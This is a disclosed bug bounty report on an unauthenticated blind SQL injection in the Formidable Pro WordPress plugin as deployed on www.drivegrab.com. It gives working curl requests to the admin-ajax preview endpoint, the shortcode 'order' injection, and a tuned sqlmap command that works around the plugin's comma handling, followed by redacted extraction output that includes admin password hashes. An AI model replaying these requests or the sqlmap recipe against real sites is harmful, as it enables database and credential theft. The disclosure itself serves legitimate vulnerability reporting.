# www.drivegrab.com SQL injection

## Report Details
- **Report ID**: 273946
- **URL**: https://hackerone.com/reports/273946
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-10-03T00:38:43.321Z
- **Disclosed**: 2017-11-17T06:28:15.090Z

## Reporter
- **Username**: jouko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grab

## Vulnerability Information
**Summary:**
The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.

**Description:**
The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.

The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.

## Browsers Verified In:
N/A

## Steps To Reproduce:
Verifying the AJAX preview function with the cURL tool:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
~~~~
This request shows a preset "contact us" form (if form id is not defined, you'll get the first form in the database).

The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
~~~~
You see that "hello world" appears on the page after the "Contact us" form.

The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.

The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:

~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
~~~~

In the resulting HTML you see some form entries between "XXX" and "YYY".

The [display-frm-data] shortcode also accepts parameters "order_by" and "order" for sorting the entries. The "order_by" parameter can contain a field ID or list of them. The "order" parameter is supposed to contain "ASC" or "DESC" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.

Example:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
~~~~

Although this example gives no meaningful output, you should see in the server logs that the "zzz" went in an SQL query which produced an error message.

The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.

The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.

A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.

I came up with the following sqlmap options to retrieve any data from the database:
~~~~
./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"
~~~~
This works with the latest sqlmap. The "commalesslimit" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.

Specifically, for each comma appearing in the order parameter, the plugin appends ",it.id" in the query. The repair code appends "-it.id+" after each comma to neutralize the effect. In other words, an injected "SELECT a,b" query would be translated to "SELECT a,it.id b" by the shortcode logic. The repair code changes it to "SELECT a, it.id-it.id+b" which evaluates to the original injected query.

Result of the above sqlmap command:
~~~~
[03:09:30] [INFO] testing █████
[03:09:30] [INFO] confirming ██████
[03:09:30] [INFO] the back-end DBMS is ███
web application technology: █████
back-end DBMS: ███████
[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'
[03:09:30] [INFO] retrieved: 1
[03:09:43] [INFO] retrieving the length of query output
[03:09:43] [INFO] ███
[03:10:46] [INFO] retrieved: █████             
SELECT ██████ FROM ████ WHERE id=2 [1]:
[*] ██████████
~~~~

## Supporting Material/References:

As a proof of concept I retrieved some data.

Tables in the database:
~~~~
[██████████]
+---------------------------------+
| █████████      |
| █████████          |
| █████████        |
| ███████     |
| ██████████ |
| ███████         |
| ██████████      |
| ████ |
| ██████████                |
| ███                   |
| ████████ |
| █████████                 |
| █████                  |
| ███             |
| █████████                  |
| ███████ |
| ███████         |
| ██████████       |
| ████             |
| █████                  |
| ██████████ |
| ███                      |
| █████                    |
| ██████████                   |
| ██████████                      |
| ████████ |
| █████████              |
| ████                   |
| ██████                      |
| ████████                   |
| ██████                      |
+---------------------------------+
~~~~

Administrator users and their password hashes:

~~~~
█████
█████
██████
████████
███
█████
████████
~~~~

Webroot path:
~~~~
███
~~~~


## Attachments
No attachments
